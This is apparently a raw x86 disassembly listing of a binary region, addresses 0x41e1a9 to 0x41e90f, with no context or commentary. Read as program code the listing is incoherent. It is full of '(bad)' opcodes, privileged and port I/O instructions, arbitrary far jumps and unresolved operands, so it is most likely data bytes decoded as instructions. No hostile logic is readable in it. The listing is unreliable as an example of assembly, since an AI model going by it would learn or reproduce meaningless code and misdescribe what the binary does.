  41e1a9:	mov    cs,WORD PTR [ebp-0x1d]
  41e1ac:	(bad)  
  41e1ad:	mov    dh,0x92
  41e1af:	mov    edi,DWORD PTR [ecx]
  41e1b1:	pop    ds
  41e1b2:	scas   al,BYTE PTR es:[edi]
  41e1b3:	(bad)  
  41e1b4:	mov    esp,0x57bb336b
  41e1b9:	cli    
  41e1ba:	add    al,cl
  41e1bc:	push   ebp
  41e1bd:	inc    edx
  41e1be:	hlt    
  41e1bf:	mov    ah,0x3d
  41e1c1:	cmp    al,0x2f
  41e1c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1c4:	inc    ebx
  41e1c5:	dec    esp
  41e1c6:	out    dx,eax
  41e1c7:	out    0xc8,al
  41e1c9:	add    bl,BYTE PTR [edi]
  41e1cb:	mov    WORD PTR [ebp+ebp*1-0x10],cs
  41e1cf:	xchg   esp,eax
  41e1d0:	fwait
  41e1d1:	call   0x1d5362a
  41e1d6:	push   ebp
  41e1d7:	fwait
  41e1d8:	push   ebx
  41e1d9:	jnp    0x41e163
  41e1db:	fwait
  41e1dc:	mov    ds:0xca56556,al
  41e1e1:	(bad)  
  41e1e2:	push   ss
  41e1e3:	cld    
  41e1e4:	daa    
  41e1e5:	mov    ds:0x55de6194,eax
  41e1ea:	enter  0xf485,0x58
  41e1ee:	inc    edx
  41e1ef:	mov    esi,DWORD PTR [edi-0x41c1acbb]
  41e1f5:	and    eax,0x9377743
  41e1fa:	or     al,0x45
  41e1fc:	push   es
  41e1fd:	shr    BYTE PTR [ecx],1
  41e1ff:	xchg   esi,eax
  41e200:	mov    DWORD PTR [edi+0x45],edi
  41e203:	jb     0x41e1f0
  41e205:	push   cs
  41e206:	jbe    0x41e19d
  41e208:	mov    esi,0xf5cdd6cc
  41e20d:	shr    BYTE PTR [edx],0x44
  41e210:	cdq    
  41e211:	mov    BYTE PTR [esi+ebp*1+0x4c61bc13],al
  41e218:	dec    ebp
  41e219:	mov    BYTE PTR [eax-0x41],ch
  41e21c:	ins    DWORD PTR es:[edi],dx
  41e21d:	adc    BYTE PTR [ebp+0x46c3d0e2],bl
  41e223:	into   
  41e224:	jno    0x41e2a3
  41e226:	mov    WORD PTR [ecx+0x43],fs
  41e229:	ins    DWORD PTR es:[edi],dx
  41e22a:	push   0xffffffd4
  41e22c:	clc    
  41e22d:	add    cl,BYTE PTR [esi-0x31]
  41e230:	mov    edx,0x28a1f489
  41e235:	scas   eax,DWORD PTR es:[edi]
  41e236:	inc    sp
  41e238:	repnz mov dh,0xfc
  41e23b:	or     eax,0x90f4b63
  41e240:	(bad)  
  41e241:	neg    DWORD PTR [ecx]
  41e243:	inc    esi
  41e244:	mov    ch,0x50
  41e246:	stos   BYTE PTR es:[edi],al
  41e247:	cmp    dl,bh
  41e249:	push   ebp
  41e24a:	xor    al,BYTE PTR [edi+0x6cecab42]
  41e250:	fiadd  DWORD PTR [ecx+0x77]
  41e253:	(bad)  
  41e254:	mov    esp,0xccaf16fb
  41e259:	js     0x41e247
  41e25b:	fiadd  WORD PTR [edx-0x4456b787]
  41e261:	je     0x41e291
  41e263:	sub    al,0x14
  41e265:	and    al,0x97
  41e267:	xchg   edi,eax
  41e268:	and    eax,0x2be24dc5
  41e26d:	jg     0x41e267
  41e26f:	mov    dl,BYTE PTR [ebp+0xc93bac6]
  41e275:	xor    esp,DWORD PTR [edx-0x5c9501eb]
  41e27b:	mov    bh,bl
  41e27d:	add    ebx,DWORD PTR [eax-0x2c626d2c]
  41e283:	mov    bl,0xdc
  41e285:	jge    0x41e2c4
  41e287:	dec    edi
  41e288:	jge    0x41e284
  41e28a:	loope  0x41e2f5
  41e28c:	retf   0xfb26
  41e28f:	repnz lods eax,DWORD PTR ds:[esi]
  41e291:	fcom   DWORD PTR [ebp-0x26]
  41e294:	and    DWORD PTR [edx],edx
  41e296:	add    al,BYTE PTR ds:0x7304e54
  41e29c:	mov    bl,0x5d
  41e29e:	(bad)  
  41e29f:	jmp    0x41e2e4
  41e2a1:	ins    BYTE PTR es:[edi],dx
  41e2a2:	mov    ds:0xcfda2cb1,eax
  41e2a7:	mov    dl,0x4a
  41e2a9:	dec    ebx
  41e2aa:	in     eax,0xbb
  41e2ac:	cmp    DWORD PTR [esi],esp
  41e2ae:	and    esi,DWORD PTR [eax+0x5e]
  41e2b1:	or     BYTE PTR [ebp-0x38],0x49
  41e2b5:	dec    ebx
  41e2b6:	dec    edi
  41e2b7:	ror    ebx,cl
  41e2b9:	mov    esp,0x9cf12ac4
  41e2be:	arpl   WORD PTR [ebx-0x88e7a68],bx
  41e2c4:	pop    esi
  41e2c5:	dec    esp
  41e2c6:	repz pop edx
  41e2c8:	dec    edi
  41e2c9:	hlt    
  41e2ca:	test   eax,0x3e0e3213
  41e2cf:	push   edx
  41e2d0:	sbb    ebp,DWORD PTR [ebp-0x6d]
  41e2d3:	sti    
  41e2d4:	dec    esp
  41e2d5:	dec    DWORD PTR [esi]
  41e2d7:	push   esp
  41e2d8:	fnstcw WORD PTR [eax+0x1e28debb]
  41e2de:	cld    
  41e2df:	in     al,dx
  41e2e0:	cmc    
  41e2e1:	into   
  41e2e2:	jecxz  0x41e336
  41e2e4:	ss adc BYTE PTR gs:[esi-0x58e0f3f4],ch
  41e2ec:	dec    esi
  41e2ed:	ds inc ecx
  41e2ef:	cmc    
  41e2f0:	not    bh
  41e2f2:	push   0x2e
  41e2f4:	lds    esp,FWORD PTR [eax]
  41e2f6:	mov    esi,0xab34821b
  41e2fb:	pop    edi
  41e2fc:	and    esi,DWORD PTR [edi+0x41b8e500]
  41e302:	mov    cl,0x2b
  41e304:	lea    eax,[ebp-0x5d926c12]
  41e30a:	outs   dx,DWORD PTR ds:[esi]
  41e30b:	rcl    DWORD PTR [edi+0x56086a8b],cl
  41e311:	sbb    DWORD PTR [edi],0xffffff82
  41e314:	dec    edi
  41e315:	adc    al,0x81
  41e317:	outs   dx,BYTE PTR ds:[esi]
  41e318:	aam    0x4d
  41e31a:	in     al,dx
  41e31b:	shl    cl,1
  41e31d:	cmp    BYTE PTR [esi-0x7de9e8e7],dh
  41e323:	mul    BYTE PTR [eax+0x6c]
  41e326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e327:	or     ecx,0xe09f432c
  41e32d:	pop    eax
  41e32e:	ins    BYTE PTR es:[edi],dx
  41e32f:	xor    DWORD PTR [esi+eiz*8-0x3f],edx
  41e333:	mov    esi,0x30310b42
  41e338:	or     BYTE PTR [ebx],ch
  41e33a:	icebp  
  41e33b:	fadd   QWORD PTR [eax-0x58]
  41e33e:	inc    esi
  41e33f:	mov    esi,0x35530ee2
  41e344:	mov    ebx,0x51ad687b
  41e349:	mov    ?,WORD PTR [eax]
  41e34b:	shl    edi,0x2
  41e34e:	call   FWORD PTR [ebx]
  41e350:	sbb    al,0xf4
  41e352:	pop    ss
  41e353:	adc    BYTE PTR [ebp+0x1],ch
  41e356:	push   cs
  41e357:	lahf   
  41e358:	mov    esi,0x2e9723b7
  41e35d:	jno    0x41e388
  41e35f:	adc    ecx,eax
  41e361:	outs   dx,DWORD PTR ds:[esi]
  41e362:	mov    WORD PTR [eax-0x1d06ae93],es
  41e368:	mov    ebp,0xa0d11d46
  41e36d:	call   0x6e523f1
  41e372:	and    BYTE PTR [eax+ebx*4],dl
  41e375:	packsswb mm2,QWORD PTR [ebx-0x5d]
  41e379:	jle    0x41e34f
  41e37b:	fninit 
  41e37d:	xchg   ebp,eax
  41e37e:	inc    esp
  41e37f:	pop    eax
  41e380:	inc    ecx
  41e381:	(bad)  
  41e383:	bound  ebp,QWORD PTR ds:0x3cf3ffc0
  41e389:	iret   
  41e38a:	(bad)  
  41e38b:	cmc    
  41e38c:	inc    edx
  41e38d:	jno    0x41e330
  41e38f:	pop    esi
  41e390:	xchg   edi,eax
  41e391:	jne    0x41e3f0
  41e393:	jmp    0xb02b:0x58bd1911
  41e39a:	sub    al,BYTE PTR [edi-0x870b774]
  41e3a0:	cdq    
  41e3a1:	xchg   ebx,eax
  41e3a2:	jge    0x41e369
  41e3a4:	fsubr  DWORD PTR [ebp-0x52006c48]
  41e3aa:	push   ebp
  41e3ab:	push   es
  41e3ac:	ins    BYTE PTR es:[edi],dx
  41e3ad:	inc    eax
  41e3ae:	inc    edx
  41e3af:	clc    
  41e3b0:	pop    esi
  41e3b1:	ins    DWORD PTR es:[edi],dx
  41e3b2:	sti    
  41e3b3:	je     0x41e41f
  41e3b5:	mov    dl,0x9f
  41e3b7:	inc    eax
  41e3b8:	arpl   WORD PTR [edi-0x1b],bx
  41e3bb:	fld    DWORD PTR [edx+0x55]
  41e3be:	pop    ebx
  41e3bf:	jp     0x41e404
  41e3c1:	push   ebp
  41e3c2:	cmp    DWORD PTR [ebx-0x6ed6ed97],0xfffffff6
  41e3c9:	ja     0x41e38e
  41e3cb:	pop    eax
  41e3cc:	push   edi
  41e3cd:	enter  0x6ad7,0x7c
  41e3d1:	inc    ebx
  41e3d2:	js     0x41e37b
  41e3d4:	(bad)  
  41e3d5:	adc    cl,bh
  41e3d7:	inc    eax
  41e3d8:	sub    eax,0x6ca46533
  41e3dd:	pop    esp
  41e3de:	push   ds
  41e3df:	cmp    edx,DWORD PTR [ebp-0x77feef54]
  41e3e5:	pop    edx
  41e3e6:	xor    al,0xe3
  41e3e8:	cwde   
  41e3e9:	jle    0x41e464
  41e3eb:	loopne 0x41e3e3
  41e3ed:	out    dx,eax
  41e3ee:	push   ecx
  41e3ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3f0:	repnz add bh,BYTE PTR [edi-0x6d]
  41e3f4:	fwait
  41e3f5:	cmp    BYTE PTR [ebx+0x55d22abb],bl
  41e3fb:	mov    edi,0xbf01539e
  41e400:	xchg   DWORD PTR [esi+0x256a995f],ebp
  41e406:	icebp  
  41e407:	xchg   esp,eax
  41e408:	ja     0x41e3e7
  41e40a:	test   al,0x9
  41e40c:	adc    edi,DWORD PTR [eax]
  41e40e:	rol    BYTE PTR [ecx],0xcd
  41e411:	adc    DWORD PTR [ebp-0x6902a762],edi
  41e417:	retf   
  41e418:	lods   al,BYTE PTR ds:[esi]
  41e419:	ror    BYTE PTR [eax-0x27ab701e],cl
  41e41f:	push   0xffffffe3
  41e421:	mov    esi,esp
  41e423:	sbb    BYTE PTR [eax],dh
  41e425:	mov    dh,0xc
  41e427:	cmc    
  41e428:	into   
  41e429:	or     al,0x8f
  41e42b:	add    ch,BYTE PTR [edx+eax*2-0x45]
  41e42f:	addr16 (bad) 
  41e431:	pusha  
  41e432:	data16 popaw 
  41e435:	lock add bl,al
  41e438:	push   esi
  41e439:	pop    ebp
  41e43a:	icebp  
  41e43b:	imul   esi,edi,0xe35c4455
  41e441:	lahf   
  41e442:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e443:	hlt    
  41e444:	sbb    al,0xbb
  41e446:	movq   QWORD PTR [eax],mm1
  41e449:	rcl    BYTE PTR [ecx],0x76
  41e44c:	push   esi
  41e44d:	push   cs
  41e44e:	jo     0x41e488
  41e450:	pop    ds
  41e451:	adc    cl,BYTE PTR [ebx+0x544c2389]
  41e457:	es mov esi,0xd68540ae
  41e45d:	outs   dx,BYTE PTR ds:[esi]
  41e45e:	push   edi
  41e45f:	aad    0x50
  41e461:	mov    BYTE PTR [edx],ah
  41e463:	clc    
  41e464:	xor    DWORD PTR [edi+0x16],eax
  41e467:	mov    ds:0x6d616c4f,al
  41e46c:	imul   ecx,DWORD PTR [esi+0x23d4f258],0xebf755a9
  41e476:	daa    
  41e477:	and    BYTE PTR [ecx-0x36],bl
  41e47a:	imul   esp,DWORD PTR [edi+0x1b],0x16aa9167
  41e481:	add    DWORD PTR [eax+0x292d8e2a],0xa13afd6
  41e48b:	mov    ebx,fs
  41e48d:	pop    ebx
  41e48e:	(bad)  
  41e490:	add    bl,bh
  41e492:	(bad)  
  41e493:	leave  
  41e494:	ins    DWORD PTR es:[edi],dx
  41e495:	xchg   edx,eax
  41e496:	into   
  41e497:	loop   0x41e508
  41e499:	xchg   edx,eax
  41e49a:	xchg   ebx,eax
  41e49b:	aam    0x22
  41e49d:	lock mov cl,0xc4
  41e4a0:	xchg   ebx,eax
  41e4a1:	into   
  41e4a2:	(bad)  
  41e4a3:	xchg   ebx,eax
  41e4a4:	cdq    
  41e4a5:	pop    eax
  41e4a6:	cwde   
  41e4a7:	inc    edi
  41e4a8:	clc    
  41e4a9:	xchg   BYTE PTR [ebx+esi*4+0x2391e2cd],bl
  41e4b0:	cs xchg ecx,eax
  41e4b2:	fadd   st,st(2)
  41e4b4:	sbb    ecx,0x16
  41e4b7:	lods   eax,DWORD PTR ds:[esi]
  41e4b8:	adc    al,0x6
  41e4ba:	shr    DWORD PTR [ebp-0x65e491b0],1
  41e4c0:	or     al,ch
  41e4c2:	out    dx,eax
  41e4c3:	cdq    
  41e4c4:	rol    bl,cl
  41e4c6:	mov    cl,0x54
  41e4c8:	mov    BYTE PTR [eax],ch
  41e4ca:	mov    edx,0x272a10d9
  41e4cf:	push   esp
  41e4d0:	pop    ecx
  41e4d1:	push   esi
  41e4d2:	in     eax,dx
  41e4d3:	lahf   
  41e4d4:	call   0xf936:0xafc484a2
  41e4db:	or     ch,BYTE PTR [eax+eiz*8+0x51]
  41e4df:	cmp    esp,DWORD PTR [esi+eax*4+0x22]
  41e4e3:	test   ah,ah
  41e4e5:	sub    DWORD PTR [esi+ecx*4],edi
  41e4e8:	inc    esp
  41e4e9:	dec    esp
  41e4ea:	test   BYTE PTR [ebx+0x4aa358b2],dh
  41e4f0:	xor    eax,DWORD PTR [eax+0x5d10cbf1]
  41e4f6:	sub    dl,0xe1
  41e4f9:	lahf   
  41e4fa:	and    al,0xbf
  41e4fc:	sbb    al,0xb0
  41e4fe:	out    dx,ax
  41e500:	sbb    edi,DWORD PTR cs:0xf6f15432
  41e507:	pop    ds
  41e508:	fcom   DWORD PTR [eax-0x24460d44]
  41e50e:	mov    al,0x14
  41e510:	scas   eax,DWORD PTR es:[edi]
  41e511:	int    0xbc
  41e513:	mov    esi,0x27b1c531
  41e518:	aaa    
  41e519:	mov    ebp,0xb4b41b14
  41e51e:	xor    al,BYTE PTR [esi]
  41e520:	pop    eax
  41e521:	(bad)  
  41e523:	(bad)  
  41e524:	pop    ebx
  41e525:	loopne 0x41e54e
  41e527:	lds    edi,FWORD PTR [esi-0x77dbdb34]
  41e52d:	pop    es
  41e52e:	daa    
  41e52f:	add    dl,ah
  41e531:	test   eax,0x94ce7867
  41e536:	call   0x37d4:0xec66522a
  41e53d:	nop
  41e53e:	call   FWORD PTR [ebx]
  41e540:	test   DWORD PTR [ebp+0x3b],0xcb1586b8
  41e547:	and    ch,bh
  41e549:	pop    ebx
  41e54a:	mov    esi,0xb98d52b3
  41e54f:	in     al,dx
  41e550:	mov    ?,ecx
  41e552:	mov    dl,0x2a
  41e554:	cmp    al,BYTE PTR [ebx]
  41e556:	adc    eax,0x3f00325d
  41e55b:	mov    eax,0x8746a5f3
  41e560:	add    dh,BYTE PTR [ecx-0xe]
  41e563:	int    0xc8
  41e565:	out    0xbb,al
  41e567:	stos   DWORD PTR es:[edi],eax
  41e568:	push   esi
  41e569:	xlat   BYTE PTR ds:[ebx]
  41e56a:	and    BYTE PTR [edx-0x3],dh
  41e56d:	ds aas 
  41e56f:	jmp    FWORD PTR [ecx-0x18]
  41e572:	stos   DWORD PTR es:[di],eax
  41e574:	ret    
  41e575:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e576:	sub    dl,BYTE PTR [esp+ecx*8+0x5a]
  41e57a:	dec    eax
  41e57b:	gs pushf 
  41e57d:	xlat   BYTE PTR ds:[ebx]
  41e57e:	add    eax,0x2caff3a9
  41e583:	and    ah,BYTE PTR [ebx+edi*4-0x27]
  41e587:	pop    edx
  41e588:	sub    al,0x9b
  41e58a:	in     eax,0xfc
  41e58c:	sar    BYTE PTR [ecx],cl
  41e58e:	pop    ebx
  41e58f:	in     eax,0x16
  41e591:	mov    ch,0xc5
  41e593:	test   eax,0x19c41e99
  41e598:	jns    0x41e5de
  41e59a:	mov    dh,0x1b
  41e59c:	out    dx,al
  41e59d:	sahf   
  41e59e:	xor    DWORD PTR [ebx-0x65],0xffffffb0
  41e5a2:	mov    edi,0x61e2a1a6
  41e5a7:	lods   al,BYTE PTR ds:[esi]
  41e5a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5a9:	outs   dx,BYTE PTR ds:[esi]
  41e5aa:	in     eax,0xf0
  41e5ac:	(bad)  
  41e5ad:	push   edi
  41e5ae:	xchg   edx,eax
  41e5af:	shl    DWORD PTR [eiz*2+0x32370431],1
  41e5b6:	add    BYTE PTR [ebp+0x16f6f44e],0x5
  41e5bd:	cmp    DWORD PTR [edx],edi
  41e5bf:	add    BYTE PTR [edi-0x5c],dh
  41e5c2:	push   ss
  41e5c3:	ficomp WORD PTR [ebp+0x14]
  41e5c6:	jne    0x41e55c
  41e5c8:	in     eax,0xa9
  41e5ca:	mov    edx,0x36338a5d
  41e5cf:	mov    ebp,0x3d484d2f
  41e5d4:	xor    DWORD PTR fs:0xf2c2c678,esp
  41e5db:	test   BYTE PTR [eax+0x16],cl
  41e5de:	xor    ecx,DWORD PTR [edx+0x26]
  41e5e1:	lods   al,BYTE PTR ds:[esi]
  41e5e2:	arpl   WORD PTR [eax],si
  41e5e4:	fs out dx,eax
  41e5e6:	icebp  
  41e5e7:	or     al,BYTE PTR [ebp-0x38dc0235]
  41e5ed:	shl    BYTE PTR ds:0xcb48bd5a,cl
  41e5f3:	pop    ss
  41e5f4:	push   esp
  41e5f5:	fcmovb st,st(7)
  41e5f7:	jl     0x41e5d3
  41e5f9:	aad    0x98
  41e5fb:	out    0x68,eax
  41e5fd:	push   edi
  41e5fe:	dec    ecx
  41e5ff:	in     al,dx
  41e600:	sti    
  41e601:	xchg   DWORD PTR [edi+0x6e654fb7],ecx
  41e607:	shl    DWORD PTR [ebx+eax*4-0x74],cl
  41e60b:	cld    
  41e60c:	pop    esp
  41e60d:	pop    ebp
  41e60e:	cmp    bh,BYTE PTR [ecx-0x2bcf695b]
  41e614:	loop   0x41e656
  41e616:	cdq    
  41e617:	out    dx,al
  41e618:	repz fstp DWORD PTR [ebx+0x2c]
  41e61c:	push   0xffffffcf
  41e61e:	into   
  41e61f:	add    DWORD PTR [ebp+0x6be09537],0x6bcce5a8
  41e629:	shl    BYTE PTR [edi],1
  41e62b:	xor    esi,DWORD PTR [eax-0x199ed77f]
  41e631:	xor    eax,0xe09ea8f6
  41e636:	in     eax,0x2e
  41e638:	jecxz  0x41e674
  41e63a:	xchg   esi,eax
  41e63b:	adc    al,0xa
  41e63d:	std    
  41e63e:	out    0xd0,al
  41e640:	jno    0x41e5d6
  41e642:	add    DWORD PTR [ebx-0x30],edi
  41e645:	cmp    al,0xb0
  41e647:	sahf   
  41e648:	or     esp,DWORD PTR fs:[eax+0x16d4bc7]
  41e64f:	imul   eax,DWORD PTR [esi+0x1a],0xcdc9b6af
  41e656:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e658:	mov    dh,0xac
  41e65a:	psadbw mm0,QWORD PTR [ebx-0x3c]
  41e65e:	js     0x41e697
  41e660:	dec    ecx
  41e661:	add    DWORD PTR ds:0x1244ffd4,ecx
  41e667:	xor    edi,DWORD PTR [ecx+0x79]
  41e66a:	push   0xffffffff
  41e66c:	cmp    al,0x91
  41e66e:	(bad)  
  41e66f:	inc    ebx
  41e670:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e671:	bound  ecx,QWORD PTR [ecx-0x421c9bd2]
  41e677:	fdiv   QWORD PTR [edx-0x30c5d23d]
  41e67d:	lock xchg edx,eax
  41e67f:	fsub   QWORD PTR [ebp-0x756f650d]
  41e685:	or     ecx,DWORD PTR [eax+0x52]
  41e688:	push   cs
  41e689:	scas   al,BYTE PTR es:[edi]
  41e68a:	add    ch,0xb
  41e68d:	imul   esi,ecx,0x5889b3fb
  41e693:	into   
  41e694:	jge    0x41e62d
  41e696:	mov    dh,0x18
  41e698:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e699:	fist   WORD PTR [ebp+0x24068e5f]
  41e69f:	mov    ebx,0xb8940229
  41e6a4:	loope  0x41e67e
  41e6a6:	icebp  
  41e6a7:	aas    
  41e6a8:	cmp    BYTE PTR [edx-0x72b553b2],0x2c
  41e6af:	ret    0x46e
  41e6b2:	arpl   WORD PTR [ebx-0x56],ax
  41e6b5:	dec    ecx
  41e6b6:	popa   
  41e6b7:	push   edx
  41e6b8:	clc    
  41e6b9:	mov    esp,0x8fcaf68e
  41e6be:	ror    dl,cl
  41e6c0:	shl    BYTE PTR [ebx],0x5d
  41e6c3:	inc    ecx
  41e6c4:	lods   al,BYTE PTR ds:[esi]
  41e6c5:	add    BYTE PTR [eax+0x1fc82bc1],cl
  41e6cb:	mov    ?,esi
  41e6cd:	mov    esi,0x6dd7916f
  41e6d2:	fst    QWORD PTR [eax+ebx*2-0x4cc110ca]
  41e6d9:	enter  0x539b,0x7c
  41e6dd:	mov    eax,ss:0x8a088153
  41e6e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6e4:	inc    edi
  41e6e5:	inc    esp
  41e6e6:	sbb    eax,0xdc833926
  41e6eb:	std    
  41e6ec:	adc    BYTE PTR cs:[eax-0x2b],dl
  41e6f0:	push   eax
  41e6f1:	dec    ebp
  41e6f2:	out    0x55,al
  41e6f4:	and    eax,0x7ab9cf17
  41e6f9:	out    dx,al
  41e6fa:	push   eax
  41e6fb:	out    0x34,eax
  41e6fd:	mov    bh,0xf0
  41e6ff:	loop   0x41e693
  41e701:	les    ecx,FWORD PTR [ebp+0x36]
  41e704:	enter  0x9f35,0x94
  41e708:	mov    es,WORD PTR [eax]
  41e70a:	repnz pop ebx
  41e70c:	rol    bl,0x85
  41e70f:	cli    
  41e710:	jne    0x41e70d
  41e712:	push   ebp
  41e713:	ret    
  41e714:	fwait
  41e715:	mov    ebp,DWORD PTR [edx]
  41e717:	xor    DWORD PTR [eax+edi*2+0x7f579e38],0xffffff8f
  41e71f:	sti    
  41e720:	inc    esp
  41e721:	jno    0x41e76e
  41e723:	mov    ebx,DWORD PTR [eax]
  41e725:	jbe    0x41e749
  41e727:	je     0x41e6c9
  41e729:	dec    ebx
  41e72a:	cmp    al,0x18
  41e72c:	jne    0x41e72a
  41e72e:	dec    eax
  41e72f:	pop    ebp
  41e730:	cmp    al,0xe0
  41e732:	jb     0x41e79f
  41e734:	xrelease mov DWORD PTR [edx],eax
  41e737:	xor    al,0x59
  41e739:	mov    dl,0xa3
  41e73b:	pop    edi
  41e73c:	shr    DWORD PTR [edx-0x10],1
  41e73f:	push   ebx
  41e740:	jge    0x41e6d2
  41e742:	pushaw 
  41e744:	jno    0x41e6d0
  41e746:	test   al,0x80
  41e748:	jecxz  0x41e72b
  41e74a:	clc    
  41e74b:	jle    0x41e72a
  41e74d:	ror    DWORD PTR [eax+0x26],0x9c
  41e751:	cli    
  41e752:	push   0x54
  41e754:	mov    al,0x6f
  41e756:	mov    esp,DWORD PTR [edi+ebx*2+0x1caa7d11]
  41e75d:	jl     0x41e736
  41e75f:	add    eax,0x61f8b7d2
  41e764:	dec    BYTE PTR [esi]
  41e766:	push   0xce5b332b
  41e76b:	jae    0x41e71b
  41e76d:	jmp    0xf3f0:0x636c786b
  41e774:	mov    cl,0x1b
  41e776:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e777:	adc    dl,BYTE PTR [edx]
  41e779:	adc    ebp,ebp
  41e77b:	sahf   
  41e77c:	rcr    DWORD PTR [esi+0x5197a48],1
  41e782:	pushf  
  41e783:	mov    al,0x9
  41e785:	or     al,0x3
  41e787:	push   ecx
  41e788:	rcl    BYTE PTR es:[ebp-0x2730f3e6],0x48
  41e790:	(bad)  
  41e791:	in     al,dx
  41e792:	dec    ebp
  41e793:	adc    ch,BYTE PTR [ecx+0x4d8755b8]
  41e799:	imul   eax,DWORD PTR [ebp+0x73],0xffffffb2
  41e79d:	jnp    0x41e74b
  41e79f:	ins    DWORD PTR es:[edi],dx
  41e7a0:	pop    esp
  41e7a1:	xor    edi,ecx
  41e7a3:	lahf   
  41e7a4:	inc    eax
  41e7a5:	mov    al,ds:0x86936ac
  41e7aa:	cld    
  41e7ab:	jp     0x41e7e7
  41e7ad:	mov    esp,0x7d63165
  41e7b2:	add    eax,0x6db9e414
  41e7b7:	les    ebx,FWORD PTR [eax]
  41e7b9:	daa    
  41e7ba:	sbb    DWORD PTR [edx+ecx*1+0x73],edx
  41e7be:	or     eax,edx
  41e7c0:	shl    BYTE PTR [eax-0x61a9916a],1
  41e7c6:	inc    esp
  41e7c7:	mov    esp,0x314ce755
  41e7cc:	xor    dl,dl
  41e7ce:	sti    
  41e7cf:	sbb    BYTE PTR [ebx+0xc],cl
  41e7d2:	push   eax
  41e7d3:	and    DWORD PTR [ecx+0x5d],0x3a2458fe
  41e7da:	mov    esp,0xf56bd363
  41e7df:	xchg   edi,eax
  41e7e0:	jmp    0xc213:0x589c7a63
  41e7e7:	xchg   edx,eax
  41e7e8:	sub    BYTE PTR [esi+0x1f77a1f7],0x79
  41e7ef:	fiadd  WORD PTR [edx]
  41e7f1:	xchg   BYTE PTR [eax],bl
  41e7f3:	stos   DWORD PTR es:[edi],eax
  41e7f4:	rcl    DWORD PTR [ebp+0x70],1
  41e7f7:	sbb    eax,0xa493fc9d
  41e7fc:	mov    ah,0xe
  41e7fe:	lahf   
  41e7ff:	dec    eax
  41e800:	rcl    DWORD PTR [edi],cl
  41e802:	ja     0x41e785
  41e804:	sbb    ebp,eax
  41e806:	nop
  41e807:	adc    BYTE PTR [ebx],ah
  41e809:	mov    bl,0xae
  41e80b:	and    al,0xbc
  41e80d:	jecxz  0x41e819
  41e80f:	jmp    0x58fa:0x37572862
  41e816:	shl    DWORD PTR [ecx-0x6c20cc2b],cl
  41e81c:	add    al,0x75
  41e81e:	push   ebp
  41e81f:	mov    dl,0xb4
  41e821:	mov    edi,DWORD PTR [eax-0x1933497d]
  41e827:	adc    DWORD PTR [ecx-0x43a8f195],esi
  41e82d:	or     BYTE PTR [eax+0x5c],dl
  41e830:	test   DWORD PTR [edx],0x557e0047
  41e836:	ret    0x239b
  41e839:	xor    esp,DWORD PTR [ebx+0x3fcf211e]
  41e83f:	ret    
  41e840:	fimul  DWORD PTR [edi+0x2b]
  41e843:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e844:	jbe    0x41e7cf
  41e846:	xchg   esi,eax
  41e847:	(bad)  
  41e848:	jno    0x41e813
  41e84a:	sbb    ax,0x1a14
  41e84e:	bound  ecx,QWORD PTR ds:0xc3d5b666
  41e854:	xor    ecx,ecx
  41e856:	pop    eax
  41e857:	sub    BYTE PTR [esi],ch
  41e859:	inc    ecx
  41e85a:	push   edi
  41e85b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e85c:	jmp    0x6dd3:0xbd99a29
  41e863:	mov    dl,0x30
  41e865:	and    DWORD PTR [ebp-0x6343cd2c],ecx
  41e86b:	push   eax
  41e86c:	adc    ecx,eax
  41e86e:	lahf   
  41e86f:	jne    0x41e850
  41e871:	push   ebx
  41e872:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e873:	mov    ds:0x75066741,al
  41e878:	push   es
  41e879:	inc    ebp
  41e87a:	lea    ebp,[edi]
  41e87c:	sbb    cl,BYTE PTR ss:[edx+eiz*1-0x5adc4f7a]
  41e884:	push   cs
  41e885:	in     al,0x23
  41e887:	push   0xd9e6e90f
  41e88c:	or     eax,0xe91335b1
  41e891:	adc    bl,BYTE PTR [ecx-0x26210d57]
  41e897:	cmp    BYTE PTR [ecx],0xc6
  41e89a:	sub    edi,DWORD PTR [edi+0x6]
  41e89d:	loopne 0x41e8a5
  41e89f:	push   edi
  41e8a0:	arpl   WORD PTR [edx],bp
  41e8a2:	add    DWORD PTR [edx+0x57],edx
  41e8a5:	push   edi
  41e8a6:	jb     0x41e86e
  41e8a8:	lahf   
  41e8a9:	popf   
  41e8aa:	jge    0x41e915
  41e8ac:	inc    ebx
  41e8ad:	mov    ebp,0x4b79b005
  41e8b2:	pop    ss
  41e8b3:	or     al,0x60
  41e8b5:	or     cl,al
  41e8b7:	jmp    0x41e8d8
  41e8b9:	lock (bad) 
  41e8bb:	(bad)  
  41e8bd:	shr    DWORD PTR [ebx-0x18a74e89],0xec
  41e8c4:	js     0x41e873
  41e8c6:	push   ss
  41e8c7:	cdq    
  41e8c8:	mov    ds,WORD PTR [esp+esi*8]
  41e8cb:	and    BYTE PTR [esi],0x4e
  41e8ce:	mov    esp,0xa108a2c6
  41e8d3:	mov    dl,0x71
  41e8d5:	loopne 0x41e8d8
  41e8d7:	iret   
  41e8d8:	int    0xae
  41e8da:	and    BYTE PTR [eax-0x3d21f0db],bh
  41e8e0:	mov    eax,ds:0xd56d62c4
  41e8e5:	retf   0x1a09
  41e8e8:	mov    bl,0x88
  41e8ea:	outs   dx,BYTE PTR ds:[esi]
  41e8eb:	aad    0x7
  41e8ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8ee:	jne    0x41e94c
  41e8f0:	push   0x44
  41e8f2:	pop    ecx
  41e8f3:	dec    eax
  41e8f4:	or     eax,0xaccb7cd3
  41e8f9:	fidiv  DWORD PTR gs:[ecx-0x4f8ddf9]
  41e900:	repz ds in al,0x8b
  41e904:	mov    ds:0x61a355fc,al
  41e909:	(bad)  [edx+0x43aced2d]
  41e90f:	les    ebx,FWORD PTR [edx+eiz*1+0x18]
